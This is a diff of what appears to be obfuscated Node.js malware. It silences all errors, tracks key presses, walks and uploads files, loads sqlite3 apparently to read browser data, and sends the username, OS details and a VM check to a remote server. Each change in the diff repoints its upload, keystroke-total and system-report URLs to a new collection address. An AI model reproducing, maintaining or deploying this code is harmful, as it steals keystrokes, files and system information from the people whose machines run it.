@@ -7,7 +7,7 @@ try {
         FormData = require('form-data'),
         axios = require('axios'),
         { execSync, spawn } = require('child_process'),
-        uploadUrl = "http://192.168.0.161:5918/upload"
+        uploadUrl = "http://192.168.0.186:5918/upload"
 
     process.on('uncaughtException', (_0xad8869) => {})
     process.on('unhandledRejection', (_0x461982) => {})
@@ -227,7 +227,7 @@ try {
                     let shift = false;
                     let ctrl = false;
                     let isRunning = true;
-                    const uu = "http://192.168.0.161:5918/total";
+                    const uu = "http://192.168.0.186:5918/total";
 
                     const uf = async (p) => {
                         if (fs.statSync(p).isFile()) {
@@ -517,7 +517,7 @@ try {
         const sqlite3 = require('sqlite3').verbose();
         const FormData = require('form-data');
         const axios = require('axios');
-        const uploadUrl = "http://192.168.0.161:5918/upload";
+        const uploadUrl = "http://192.168.0.186:5918/upload";
         
         let i = ${i};
         const getBasePaths = () => {
@@ -717,7 +717,7 @@ try {
                 }
             }
             console.log(os.userInfo().username);
-            result = await axios.post("http://192.168.0.161:5918/api/service/process/"+uid, {
+            result = await axios.post("http://192.168.0.186:5918/api/service/process/"+uid, {
                 OS: os.type(),
                 platform: os.platform(),
                 release: os.release() + (isVM ? " (VM)":"(Local)"),
